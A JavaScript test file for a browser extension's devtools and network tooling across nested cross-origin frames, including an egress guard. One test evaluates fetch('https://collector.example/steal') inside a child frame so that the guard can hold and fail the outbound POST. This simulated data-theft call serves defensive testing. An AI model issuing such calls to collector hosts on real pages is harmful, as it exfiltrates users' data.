// @ts-check
// Frames across net, console, sources, api and the egress guard: a top page, a cross-origin child session and one nested
// inside it. Fakes only (devtools-kit + the real lib/frames.js over the fake debugger layer).
import { test } from "node:test";
import assert from "node:assert/strict";
import net from "./extension/caps/net.js";
import dev from "./extension/caps/devtools.js";
import api from "./extension/caps/api.js";
import { createFrames } from "./extension/lib/frames.js";
import { makeCtx, request, realisticFrameTree } from "./devtools-kit.js";
import { guardInstall, guardInstallWrites, guardCollect } from "./extension/shared/outbound.js";

const SHELL = "https://shell.harlow.example";
const APP = "https://app.harlow.example";
const PAY = "https://pay.harlow.example";
const APP_API = "https://api.app.harlow.example";

const tree = {
  frame: { id: "TOP", url: SHELL + "/", securityOrigin: SHELL },
  childFrames: [{ frame: { id: "APP", parentId: "TOP", url: APP + "/workflows", securityOrigin: APP }, childFrames: [{ frame: { id: "INNER", parentId: "APP", url: PAY + "/", securityOrigin: PAY } }] }],
};
const KIDS = [
  { sessionId: "S-APP", targetId: "APP", type: "iframe", url: APP + "/workflows" },
  { sessionId: "S-INNER", targetId: "INNER", type: "iframe", url: PAY + "/" },
];

/** @param {any} [extra] respond overrides */
function world(extra = {}) {
  const k = makeCtx({ active: 1, tabUrl: SHELL + "/", respond: { "Page.getFrameTree": realisticFrameTree(tree, KIDS), ...extra } });
  for (const c of KIDS) k.children.push(c);
  /** @type {any} */ (k.ctx).frames = createFrames({ cdp: /** @type {any} */ (k.ctx.cdp) });
  const st = new Map();
  /** @type {any} */ (k.ctx).storage = { session: { get: async (/** @type {string} */ key) => (st.has(key) ? { [key]: structuredClone(st.get(key)) } : {}), set: async (/** @type {any} */ o) => { for (const [a, b] of Object.entries(o)) st.set(a, structuredClone(b)); } } };
  return k;
}

test("net: every session captures; equal requestIds do not collide; records are tagged and filterable by frame", async () => {
  const k = world();
  await net.ops["net.start"]({ tab: 1 }, k.ctx);
  assert.ok(k.callsIn("Network.enable", "S-APP").length && k.callsIn("Network.enable", "S-INNER").length, "Network is on in every child session");
  request(k, 1, { id: "1", url: SHELL + "/api/me", documentURL: SHELL + "/" });
  request(k, 1, { id: "1", session: "S-APP", url: APP_API + "/workflows/list", documentURL: APP + "/workflows" });
  request(k, 1, { id: "1", session: "S-INNER", url: PAY + "/api/card", documentURL: PAY + "/" });
  const all = await net.ops["net.list"]({ tab: 1 }, k.ctx);
  assert.equal(all.count, 3, "three records, none overwritten");
  assert.deepEqual(all.requests.map((/** @type {any} */ r) => [r.frame, r.frameIndex]), [[SHELL, 0], [APP, 1], [PAY, 2]]);
  assert.equal(new Set(all.requests.map((/** @type {any} */ r) => r.id)).size, 3);
  const app = await net.ops["net.list"]({ tab: 1, filter: { frame: "app.harlow" } }, k.ctx);
  assert.deepEqual(app.requests.map((/** @type {any} */ r) => r.url), [APP_API + "/workflows/list"]);
  const viaArg = await net.ops["net.list"]({ tab: 1, frame: "pay.harlow" }, k.ctx);
  assert.equal(viaArg.count, 1);
  const got = await net.ops["net.get"]({ tab: 1, id: app.requests[0].id, bodies: true }, k.ctx);
  assert.equal(got.frame, APP);
  assert.equal(k.callsIn("Network.getResponseBody", "S-APP").length, 1, "the body is asked of the session that owns it");
});

test("net.watch filters by frame", async () => {
  const k = world();
  const w = await net.ops["net.watch"]({ tab: 1, filter: { frame: "pay.harlow" } }, k.ctx);
  assert.ok(w.watchId);
  request(k, 1, { id: "a", url: SHELL + "/x", documentURL: SHELL + "/" });
  request(k, 1, { id: "b", session: "S-INNER", url: PAY + "/y", documentURL: PAY + "/" });
  const ev = k.emitted.filter(e => e.event === "net.event");
  assert.equal(ev.length, 1);
  assert.equal(ev[0].request.frame, PAY);
});

test("net: a child that attaches mid-capture is picked up", async () => {
  const k = world();
  await net.ops["net.start"]({ tab: 1 }, k.ctx);
  k.children.push({ sessionId: "S-LATE", targetId: "LATE", type: "iframe", url: "https://late.harlow.example/" });
  k.push(1, "Target.attachedToTarget", { sessionId: "S-LATE", targetInfo: { targetId: "LATE", type: "iframe", url: "https://late.harlow.example/" } });
  assert.equal(k.callsIn("Network.enable", "S-LATE").length, 1);
  request(k, 1, { id: "1", session: "S-LATE", url: "https://late.harlow.example/api/z" });
  const l = await net.ops["net.list"]({ tab: 1, frame: "late.harlow" }, k.ctx);
  assert.equal(l.count, 1, "no documentURL: the frame is the child's own target origin");
  k.push(1, "Target.detachedFromTarget", { sessionId: "S-LATE" });
});

test("net: a child navigating to a blind page purges its own records, not the others", async () => {
  const k = world();
  await net.ops["net.start"]({ tab: 1 }, k.ctx);
  request(k, 1, { id: "1", url: SHELL + "/api/me", documentURL: SHELL + "/" });
  request(k, 1, { id: "1", session: "S-APP", url: APP_API + "/a", documentURL: APP + "/" });
  k.push(1, "Network.requestWillBeSent", { requestId: "9", type: "Document", request: { url: "https://accounts.google.com/signin", method: "GET", headers: {} } }, "S-APP");
  const l = await net.ops["net.list"]({ tab: 1 }, k.ctx);
  assert.deepEqual(l.requests.map((/** @type {any} */ r) => r.frame), [SHELL]);
});

test("console and sources: entries carry the frame, filter by it, and a child's script is read from its own session", async () => {
  const k = world({ "Debugger.getScriptSource": () => ({ scriptSource: "const x = 1;" }) });
  await dev.ops["dev.console.read"]({ tab: 1 }, k.ctx);
  await dev.ops["dev.sources.list"]({ tab: 1 }, k.ctx);
  assert.ok(k.callsIn("Runtime.enable", "S-APP").length && k.callsIn("Log.enable", "S-INNER").length && k.callsIn("Debugger.enable", "S-APP").length, "groups are on in the children");
  k.push(1, "Runtime.consoleAPICalled", { type: "log", args: [{ type: "string", value: "from shell" }] });
  k.push(1, "Runtime.consoleAPICalled", { type: "log", args: [{ type: "string", value: "from builder" }] }, "S-APP");
  const c = await dev.ops["dev.console.read"]({ tab: 1, frame: "app.harlow" }, k.ctx);
  assert.deepEqual(c.entries.map((/** @type {any} */ e) => [e.text, e.frame]), [["from builder", APP]]);
  const every = await dev.ops["dev.console.read"]({ tab: 1 }, k.ctx);
  assert.equal(every.count, 2);
  k.push(1, "Debugger.scriptParsed", { scriptId: "5", url: SHELL + "/shell.js", length: 10 });
  k.push(1, "Debugger.scriptParsed", { scriptId: "5", url: APP + "/builder.js", length: 20 }, "S-APP");
  const l = await dev.ops["dev.sources.list"]({ tab: 1 }, k.ctx);
  assert.equal(l.count, 2, "equal script ids in two sessions do not collide");
  const child = l.scripts.find((/** @type {any} */ s) => s.frame === APP);
  const src = await dev.ops["dev.sources.get"]({ tab: 1, scriptId: child.scriptId }, k.ctx);
  assert.equal(src.source, "const x = 1;");
  const call = k.callsIn("Debugger.getScriptSource", "S-APP");
  assert.equal(call.length, 1);
  assert.equal(call[0].params.scriptId, "5", "the session's own script id");
  const only = await dev.ops["dev.sources.list"]({ tab: 1, frame: "app.harlow" }, k.ctx);
  assert.equal(only.count, 1);
  k.push(1, "Target.attachedToTarget", { sessionId: "S-NEW", targetInfo: { targetId: "N", type: "iframe", url: "https://n.harlow.example/" } });
  assert.ok(k.callsIn("Runtime.enable", "S-NEW").length, "a late frame gets the groups too");
});

test("dev.inspect runs in the frame it is told to", async () => {
  const k = world({ "DOM.getDocument": { root: { nodeId: 1 } }, "DOM.querySelector": { nodeId: 7 }, "DOM.getOuterHTML": { outerHTML: "<button>Save</button>" } });
  const r = await dev.ops["dev.inspect"]({ tab: 1, selector: "button", frame: "app.harlow" }, k.ctx);
  assert.equal(r.frameOrigin, APP);
  assert.ok(k.callsIn("DOM.querySelector", "S-APP").length && k.callsIn("DOM.getOuterHTML", "S-APP").length && k.callsIn("DOM.enable", "S-APP").length);
  assert.equal(k.calls("DOM.querySelector").filter(s => !s.session).length, 0, "nothing went to the top session");
  await assert.rejects(dev.ops["dev.inspect"]({ tab: 1, selector: "button", frame: "nowhere.example" }, k.ctx), /no frame matches/);
});

test("api.learn learns what only a child frame called; api.call defaults to that frame and runs there, guarded by that frame's origin", async () => {
  const ok = { result: { value: { status: 200, mime: "application/json", headers: {}, body: "{}" } } };
  const k = world({ "Runtime.evaluate": () => ok });
  await net.ops["net.start"]({ tab: 1 }, k.ctx);
  request(k, 1, { id: "1", url: SHELL + "/api/me", documentURL: SHELL + "/" });
  request(k, 1, { id: "2", session: "S-APP", url: APP_API + "/workflows/3f2b8c1e-9a47-4d55-b0c1-7e6d5a4c3b2a/steps", documentURL: APP + "/workflows", headers: { Authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGV4In0.c2lnbmF0dXJlMTIzNDU" } });
  const r = await api.ops["api.learn"]({ tab: 1 }, k.ctx);
  const e = r.entries.find((/** @type {any} */ x) => x.pathTemplate === "/workflows/{id}/steps");
  assert.ok(e, "the child's endpoint is in the catalog");
  assert.equal(e.frame, APP);
  assert.equal(r.entries.find((/** @type {any} */ x) => x.pathTemplate === "/api/me").frame, SHELL);
  const cat = await api.ops["api.catalog"]({ tab: 1 }, k.ctx);
  assert.ok(cat.entries.some((/** @type {any} */ x) => x.id === e.id));
  const out = await api.ops["api.call"]({ tab: 1, entryId: e.id, params: { path: { id: "3f2b8c1e-9a47-4d55-b0c1-7e6d5a4c3b2a" } } }, k.ctx);
  assert.equal(out.status, 200);
  assert.equal(out.frame, 1);
  const ev = k.calls("Runtime.evaluate").filter(s => /fetch\(P\.url/.test(s.params.expression)).at(-1);
  assert.equal(ev.session, "S-APP", "the fetch ran inside the frame it was learned in");
  const payload = JSON.parse(ev.params.expression.match(/\}\)\((\{.*\})\)$/s)[1]);
  assert.equal(payload.origin, APP, "the guard compares against that frame's origin, not the top page's");
  assert.match(payload.init.headers.Authorization, /^Bearer /);
  // An explicit frame wins over where it was learned.
  await api.ops["api.call"]({ tab: 1, entryId: e.id, frame: 2, params: { path: { id: "3f2b8c1e-9a47-4d55-b0c1-7e6d5a4c3b2a" } } }, k.ctx);
  const ev2 = k.calls("Runtime.evaluate").filter(s => /fetch\(P\.url/.test(s.params.expression)).at(-1);
  assert.equal(ev2.session, "S-INNER");
  assert.equal(JSON.parse(ev2.params.expression.match(/\}\)\((\{.*\})\)$/s)[1]).origin, PAY);
  await assert.rejects(api.ops["api.call"]({ tab: 1, entryId: e.id, frame: "nowhere", params: { path: { id: "3f2b8c1e-9a47-4d55-b0c1-7e6d5a4c3b2a" } } }, k.ctx), /no frame matches/);
});

test("egress guard: a fetch to a fresh origin from inside a child is held, its own API origin is not; every session is guarded and restored", async () => {
  const seen = { ran: false };
  const k = world();
  k.respond["Runtime.evaluate"] = (/** @type {any} */ p, /** @type {number} */ _t, /** @type {string|undefined} */ session) => {
    const x = String(p.expression);
    if (x === guardInstallWrites) return { result: { value: true } };
    if (x === guardCollect) return { result: { value: [] } };
    if (x.includes("querySelectorAll('iframe, frame')")) return { result: { value: [] } };
    if (x.includes("getEntriesByType")) return { result: { value: session === "S-APP" ? [APP_API + "/known"] : [] } };
    if (x.includes("visible")) return { result: { value: false } };
    seen.ran = true;
    // the script inside the builder frame talks to its own API host and to a stranger
    k.push(1, "Fetch.requestPaused", { requestId: "own", request: { url: APP_API + "/known", method: "GET" }, resourceType: "Fetch" }, "S-APP");
    k.push(1, "Fetch.requestPaused", { requestId: "own2", request: { url: APP + "/x", method: "GET" }, resourceType: "Fetch" }, "S-APP");
    k.push(1, "Fetch.requestPaused", { requestId: "evil", request: { url: "https://collector.example/steal", method: "POST" }, resourceType: "Fetch" }, "S-APP");
    return { result: { type: "string", value: "done" } };
  };
  const r = await dev.ops["dev.console.eval"]({ tab: 1, frame: "app.harlow", expression: "fetch('https://collector.example/steal')" }, k.ctx);
  assert.ok(seen.ran);
  assert.equal(r.held, true, "the stranger origin is held");
  assert.equal(k.callsIn("Fetch.failRequest", "S-APP").filter(s => s.params.requestId === "evil").length, 1, "failed on the session that paused it");
  assert.equal(k.calls("Fetch.failRequest").length, 1, "nothing else failed");
  assert.deepEqual(k.callsIn("Fetch.continueRequest", "S-APP").map(s => s.params.requestId).sort(), ["own", "own2"], "the frame's own origins go through, on its session");
  for (const s of [undefined, "S-APP", "S-INNER"]) assert.ok(k.sent.some(x => x.method === "Fetch.enable" && x.session === s), `Fetch on for ${s || "top"}`);
  for (const s of [undefined, "S-APP", "S-INNER"]) assert.ok(k.sent.some(x => x.method === "Fetch.disable" && x.session === s), `Fetch restored for ${s || "top"}`);
  assert.equal(k.ctx.dnr.removed.length, 1, "the tab rule is lifted");
  assert.ok(k.sent.some(x => x.params && x.params.expression === guardInstallWrites && x.session === "S-APP"), "the send-hold shim is in the same frame as the script");
  assert.ok(k.sent.some(x => x.params && x.params.expression === guardCollect && x.session === "S-APP"));
  // The password scan looked in every readable frame.
  const scans = k.sent.filter(x => x.method === "Runtime.evaluate" && String(x.params.expression).includes("isPassword"));
  assert.deepEqual(scans.map(x => x.session || "top").sort(), ["S-APP", "S-INNER", "top"]);
});

test("dev.console.eval: a password field in a child frame stops the script", async () => {
  const k = world();
  k.respond["Runtime.evaluate"] = (/** @type {any} */ p, /** @type {number} */ _t, /** @type {string|undefined} */ session) => ({ result: { value: session === "S-INNER" && String(p.expression).includes("isPassword") } });
  await assert.rejects(dev.ops["dev.console.eval"]({ tab: 1, expression: "1" }, k.ctx), /frame 2 .* has a password field/);
});
